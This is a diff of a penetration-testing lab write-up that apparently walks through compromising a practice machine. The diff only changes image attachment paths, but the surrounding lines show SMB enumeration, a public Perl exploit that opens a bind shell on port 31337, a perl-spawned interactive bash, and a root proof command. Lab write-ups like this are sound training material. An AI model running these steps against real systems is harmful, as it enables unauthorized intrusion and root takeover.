@@ -144,10 +144,10 @@ Host script results:
 ```
 
 ## Port 80
-![[Pasted image 20210923194340.png]]
+![[../Attachments/Pasted image 20210923194340.png]]
 
 Converted Binary
-![[Pasted image 20210923194500.png]]
+![[../Attachments/Pasted image 20210923194500.png]]
 ```
 ifyoudontpwnmeuran00b
 ```
@@ -205,7 +205,7 @@ Command
 ```
 smbmap -H 192.168.132.42
 ```
-![[Pasted image 20210923195303.png]]
+![[../Attachments/Pasted image 20210923195303.png]]
 
 ---
 
@@ -217,7 +217,7 @@ Command
 ```
 perl 4761.pl 192.168.132.42
 ```
-![[Pasted image 20210924162137.png]]
+![[../Attachments/Pasted image 20210924162137.png]]
 
 Script opens Port 31337 for a bind shell.
 
@@ -232,7 +232,7 @@ Command
 ```
 perl -e 'system("bash -i");
 ```
-![[Pasted image 20210924162615.png]]
+![[../Attachments/Pasted image 20210924162615.png]]
 
 Root Access
 
@@ -247,4 +247,4 @@ Command
 ```
 ifconfig;id;hostname;cat proof.txt
 ```
-![[Pasted image 20210924162935.png]]
+![[../Attachments/Pasted image 20210924162935.png]]
